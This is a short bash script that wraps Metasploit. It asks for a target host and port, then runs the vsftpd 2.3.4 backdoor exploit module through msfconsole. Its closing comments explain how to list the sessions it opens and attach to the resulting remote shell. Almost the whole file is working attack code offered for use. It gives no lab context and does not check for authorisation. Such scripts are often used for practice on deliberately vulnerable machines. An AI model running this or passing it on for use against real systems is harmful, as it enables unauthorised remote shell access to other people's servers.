#!/bin/bash

#this script utilizes the metasploit-framework to run an exploit against services running vsftpd v2.3.4

#takes user input for a target IP
echo "enter a target host: "
read RHOST1

#takes user input for a target IP, should be preconfigured to 21 but just incase 
echo "enter a target port: " 
read RPORT1


#starts msfconsole while executing the commands to use an exploit, set the required options, and run the exploit
msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor;\

set RHOSTS $RHOST1;\

set RPORT $RPORT1;\

exploit"


#if a shell doesn't automatically open run 'sessions -l' to list open sessions. This should show the session ID of the shell that was opened

#Then run 'sessions -i <session id> to connect to the shell
